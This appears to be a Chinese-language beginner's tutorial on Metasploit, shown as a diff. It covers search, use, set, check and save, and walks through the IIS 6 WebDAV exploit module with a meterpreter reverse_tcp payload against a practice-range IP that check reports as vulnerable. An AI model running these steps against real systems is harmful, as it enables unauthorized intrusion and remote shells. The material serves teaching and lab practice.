@@ -1,0 +1,232 @@
+<p>metasploit 超级超级厉害。</p>
+<p>可以认为它就是黑客的武器库。&#160;</p>
+<p>官网：https://github.com/rapid7/metasploit-framework/wiki</p>
+<p>完整的文档 在这里：<a href="https://www.offensive-security.com/metasploit-unleashed/metasploit-fundamentals">https://www.offensive-security.com/metasploit-unleashed/metasploit-fundamentals/</a>
+</p>
+
+
+<h3>启动</h3>
+<p>kali -&gt; windows 键 -&gt; metasploit framework, 输入sudo 密码，就会看到它慢慢的启动了。</p>
+<pre>         =[ metasploit v6.0.30-dev                          ]
++ -- --=[ 2099 exploits - 1129 auxiliary - 357 post       ]
++ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: To save all commands executed since start up 
+to a file, use the makerc command
+
+msf6 &gt; 
+
+</pre>
+<h3>使用</h3>
+<p>基本命令：&#160;</p>
+<p>help 查看帮助，有很多命令</p>
+<p>search 搜索， 例如：&#160;&#160;</p>
+<p>search cve:2021&#160; 查看2021年的cve&#160;</p>
+<p>search -S "IIS" 查看 标题中带有IIS的内容</p>
+<p>search cve:2020 platform:windows 查看 cve 2020中的标题含有 windows的内容。 （貌似大小写不敏感，有就直接搜索出来）</p>
+<p>search cve:2017 与 search cve:7269, search 2017 7269 效果都是一样的。</p>
+<p>info 0 查看search的第一个搜索结果&#160; 好几个屏幕，非常详细。</p>
+<p>use 0&#160; 使用search 第一个搜索结果.&#160;</p>
+<p>back: 从当前任务退出。&#160;</p>
+<p>show options 查看当前的任务（cve xxx ）的使用选项。</p>
+<pre>msf6 &gt; use 0
+[*] Using configured payload windows/meterpreter/reverse_tcp
+msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; show options 
+
+Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   MAXPATHLENGTH  60               yes       End of physical path brute force
+   MINPATHLENGTH  3                yes       Start of physical path brute force
+   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
+   RPORT          80               yes       The target port (TCP)
+   SSL            false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI      /                yes       Path of IIS 6 web application
+   VHOST                           no        HTTP server virtual host
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.0.102    yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Microsoft Windows Server 2003 R2 SP2 x86
+</pre>
+
+<h3> 接下来使用set 命令，来进行各种参数的设置&#160; ( unset : 取消设置。 setg: 全局设置&#160; unsetg 同理）</h3>
+<pre>（以下都是靶场的信息）
+msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; set RHOSTS 59.63.200.79
+RHOSTS =&gt; 59.63.200.79
+msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; set RPORT 8005
+RPORT =&gt; 8005
+msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; set TARGETURI /
+TARGETURI =&gt; /
+msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; 
+</pre>
+<p>然后就可以开始了 （run 或者 exploit,&#160; 也有 rerun, rexploit ，也可以使用check来确认是否有漏洞 ）</p>
+<h3>下面是 exploit的详细命令</h3>
+<pre>Exploit Commands
+================
+
+    Command       Description
+    -------       -----------
+    check         Check to see if a target is vulnerable
+    exploit       Launch an exploit attempt
+    rcheck        Reloads the module and checks if the target is vulnerable
+    recheck       Alias for rcheck
+    reload        Just reloads the module
+    rerun         Alias for rexploit
+    rexploit      Reloads the module and launches an exploit attempt
+    run           Alias for exploit
+</pre>
+<p>注意 RHost 的值应该是 1.2.3.4 而不是 http://1.2.3.4</p>
+<p>msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; check<br />[+] 59.63.200.79:8005 - The target is vulnerable.</p>
+<p>可以看到，该目标是可以被爆破的。</p>
+<p>set HTTPTRACE true&#160;&#160;</p>
+<p>就可以让进程打印详细日志了。</p>
+<h3>查看安装位置&#160; sudo msfdb status, 默认&#160;/usr/share/metasploit-framework</h3>
+<pre>└─$ sudo msfdb status                                                                                                                                                   1 ⨯
+● postgresql.service - PostgreSQL RDBMS
+     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)
+     Active: active (exited) since Sun 2021-03-28 01:56:30 EDT; 1h 19min ago
+    Process: 7101 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
+   Main PID: 7101 (code=exited, status=0/SUCCESS)
+        CPU: 4ms
+
+Mar 28 01:56:30 kali systemd[1]: Starting PostgreSQL RDBMS...
+Mar 28 01:56:30 kali systemd[1]: Finished PostgreSQL RDBMS.
+
+COMMAND   PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
+postgres 7080 postgres    5u  IPv6 144768      0t0  TCP localhost:5432 (LISTEN)
+postgres 7080 postgres    6u  IPv4 144769      0t0  TCP localhost:5432 (LISTEN)
+
+UID          PID    PPID  C STIME TTY      STAT   TIME CMD
+postgres    7080       1  0 01:56 ?        Ss     0:00 /usr/lib/postgresql/13/bin/postgres -D /var/lib/postgresql/13/main -c config_file=/etc/postgresql/13/main/postgresql.
+
+[+] Detected configuration file (/usr/share/metasploit-framework/config/database.yml)
+
+</pre>
+<p>关于数据库的进一步设置，（平时的search, use 都用不到，可以参考我接下来的文章）</p>
+<h3>如何保存当前的options : save</h3>
+<p>msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; save<br />Saved configuration to: /home/kali/.msf4/config</p>
+<p>打开这个文件就可以看到各种选项了（刚才输入的），例如：</p>
+<pre>[framework/core]
+
+[framework/features]
+
+[framework/ui/console]
+ActiveModule=exploit/windows/iis/iis_webdav_scstoragepathfromurl
+
+[windows/iis/iis_webdav_scstoragepathfromurl]
+VERBOSE=false
+WfsDelay=0
+EnableContextEncoding=false
+DisablePayloadHandler=false
+RHOSTS=59.63.200.79
+RPORT=8005
+SSL=false
+UserAgent=Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+HttpUsername=
+HttpPassword=
+DigestAuthIIS=true
+SSLVersion=Auto
+FingerprintCheck=true
+DOMAIN=WORKSTATION
+HttpTrace=true
+HttpTraceHeadersOnly=false
+HttpTraceColors=red/blu
+HTTP::uri_encode_mode=hex-normal
+HTTP::uri_full_url=false
+HTTP::pad_method_uri_count=1
+HTTP::pad_uri_version_count=1
+HTTP::pad_method_uri_type=space
+HTTP::pad_uri_version_type=space
+HTTP::method_random_valid=false
+HTTP::method_random_invalid=false
+HTTP::method_random_case=false
+HTTP::version_random_valid=false
+HTTP::version_random_invalid=false
+HTTP::uri_dir_self_reference=false
+HTTP::uri_dir_fake_relative=false
+HTTP::uri_use_backslashes=false
+HTTP::pad_fake_headers=false
+HTTP::pad_fake_headers_count=0
+HTTP::pad_get_params=false
+HTTP::pad_get_params_count=16
+HTTP::pad_post_params=false
+HTTP::pad_post_params_count=16
+HTTP::uri_fake_end=false
+HTTP::uri_fake_params_start=false
+HTTP::header_folding=false
+TARGETURI=/
+MINPATHLENGTH=1
+MAXPATHLENGTH=100
+PAYLOAD=windows/meterpreter/reverse_tcp
+LHOST=192.168.0.102
+</pre>
+<p>下次重新进入该 cve 之后（使用search, use ）输入 options, 就会发现上次填写的内容还在。</p>
+<h3>如何更新modules</h3>
+<div>apt update; apt install metasploit-framework</div>
+<h3>如何查看版本号&#160;msfconsole --version
+</h3>
+<h3>在当前module下查看各种信息</h3>
+<p>$ show info/payloads/... 查看对应的信息， 可以使用的payloads等</p>
+<h3>查看更详细的说明&#160; show advanced&#160;</h3>
+<p>该模块可以看到几乎所有的选项。 包括HttpTrace 等。 如下：</p>
+<pre>Module advanced options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):
+
+   Name                    Current Setting                                 Required  Description
+   ----                    ---------------                                 --------  -----------
+   ContextInformationFile                                                  no        The information file that contains context information
+   DOMAIN                  WORKSTATION                                     yes       The domain to use for Windows authentication
+   DigestAuthIIS           true                                            no        Conform to IIS, should work for most servers. Only set to false for non-IIS servers
+   DisablePayloadHandler   false                                           no        Disable the handler code for the selected payload
+   EnableContextEncoding   false                                           no        Use transient context when encoding payloads
+   FingerprintCheck        true                                            no        Conduct a pre-exploit fingerprint verification
+   HttpClientTimeout                                                       no        HTTP connection and receive timeout
+   HttpPassword                                                            no        The HTTP password to specify for authentication
+   HttpRawHeaders                                                          no        Path to ERB-templatized raw headers to append to existing headers
+   HttpTrace               false                                           no        Show the raw HTTP requests and responses
+   HttpTraceColors         red/blu                                         no        HTTP request and response colors for HttpTrace (unset to disable)
+   HttpTraceHeadersOnly    false                                           no        Show HTTP headers only in HttpTrace
+   HttpUsername                                                            no        The HTTP username to specify for authentication
+   SSLVersion              Auto                                            yes       Specify the version of SSL/TLS to be used (Auto, TLS and SSL23 are auto-negotiate) (Ac
+                                                                                     cepted: Auto, TLS, SSL23, SSL3, TLS1, TLS1.1, TLS1.2)
+   UserAgent               Mozilla/4.0 (compatible; MSIE 6.0; Windows NT   no        The User-Agent header to use for all requests
+                           5.1)
+   VERBOSE                 false                                           no        Enable detailed status messages
+   WORKSPACE                                                               no        Specify the workspace for this module
+   WfsDelay                0                                               no        Additional delay when waiting for a session
+
+Payload advanced options (windows/meterpreter/reverse_tcp):
+
+   Name                         Current Setting  Required  Description
+   ----                         ---------------  --------  -----------
+   AutoLoadStdapi               true             yes       Automatically load the Stdapi extension
+   AutoRunScript                                 no        A script to run automatically on session creation.
+   AutoSystemInfo               true             yes       Automatically capture system information on initialization.
+   AutoUnhookProcess            false            yes       Automatically load the unhook extension and unhook the process
+   AutoVerifySessionTimeout     30               no        Timeout period to wait for session validation to occur, in seconds
+   EnableStageEncoding          false            no        Encode the second stage payload
+   EnableUnicodeEncoding        false            yes       Automatically encode UTF-8 strings as hexadecimal
+   HandlerSSLCert                                no        Path to a SSL certificate in unified PEM format, ignored for HTTP transports
+   InitialAutoRunScript                          no        An initial script to run on session creation (before AutoRunScript)
+   PayloadBindPort                               no        Port to bind reverse tcp socket to on target system.
+   PayloadProcessCommandLine                     no        The displayed command line that will be used by the payload
+   PayloadUUIDName                               no        A human-friendly name to reference this unique payload (requires tracking)
+   PayloadUUIDRaw                                no        A hex string representing the raw 8-byte PUID value for the UUID
+   PayloadUUIDSeed                               no        A string to use when generating the payload UUID (deterministic)
+   PayloadUUIDTracking          false            yes       Whether or not to automatically register generated UUIDs
+   PingbackRetries              0                yes       How many additional successful pingbacks</pre>
+<h3>配置文件路径：&#160; ~/.msf4/config&#160;</h3>
